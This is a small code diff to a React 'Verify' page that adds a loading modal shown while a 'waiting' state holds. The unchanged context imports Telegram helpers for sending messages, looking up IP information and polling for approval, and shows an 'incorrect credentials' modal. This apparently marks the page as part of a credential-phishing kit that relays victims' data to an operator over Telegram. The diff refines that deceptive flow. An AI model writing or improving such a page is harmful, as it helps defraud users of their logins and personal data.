@@ -4,6 +4,7 @@ import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
 import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
+import { LoadingModal } from "@/components/loading-modal";
 
 
 const languageOptions: { code: Language; label: string }[] = [
@@ -167,6 +168,7 @@ export default function Verify() {
       className="min-h-screen flex flex-col items-center justify-center"
       style={{ background: "#f7f7f7" }}
     >
+      <LoadingModal show={waiting} />
       {/* ── INCORRECT CREDENTIALS MODAL ── */}
       {showModal && (
         <div style={{
